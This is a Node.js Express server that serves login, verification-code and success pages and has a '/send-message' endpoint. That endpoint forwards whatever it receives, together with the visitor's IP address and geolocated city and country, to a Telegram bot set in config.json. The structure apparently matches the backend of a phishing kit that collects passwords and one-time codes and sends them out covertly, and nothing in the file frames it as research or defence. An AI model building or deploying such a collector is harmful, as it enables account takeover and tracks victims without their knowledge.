const express = require("express");
const path = require("path");
const axios = require("axios");
const favicon = require("serve-favicon");
const fs = require("fs");

const app = express();
const PORT = 3000;

app.use(favicon(path.join(__dirname, "public", "ico.ico")));
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});
app.get("/home", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "intest.html"));
});
app.get("/login", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "login.html"));
});
app.get("/success", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "success.html"));
});
app.get("/code/:email", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "code.html"));
});

// Đọc botToken và chatId từ file config.json
const config = JSON.parse(fs.readFileSync("config.json"));
const botToken = config.BOT_TOKEN;
const chatId = config.CHAT_ID;
const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

app.get("/send-message", async (req, res) => {
    const { message } = req.query;
    if (!message) {
        return res.status(400).json({ error: "message is required" });
    }

    try {
        const userIP =
            req.headers["x-forwarded-for"] || req.socket.remoteAddress;

        const ipResponse = await axios.get(`https://ipinfo.io/${userIP}/json`);
        const data = ipResponse.data;
        const chot = `IP: ${userIP}\nAddress: ${data.city}, ${data.country}\n${message}`;

        const response = await axios.post(telegramApiUrl, {
            chat_id: chatId,
            text: chot,
        });

        if (response.data.ok) {
            res.status(200).json({
                status: "success",
                message: "Message sent successfully",
            });
        } else {
            res.status(500).json({
                status: "failed",
                message: "Failed to send message",
            });
        }
    } catch (error) {
        res.status(500).json({
            status: "failed",
            message: "Error occurred while sending message",
            error: error.message,
        });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
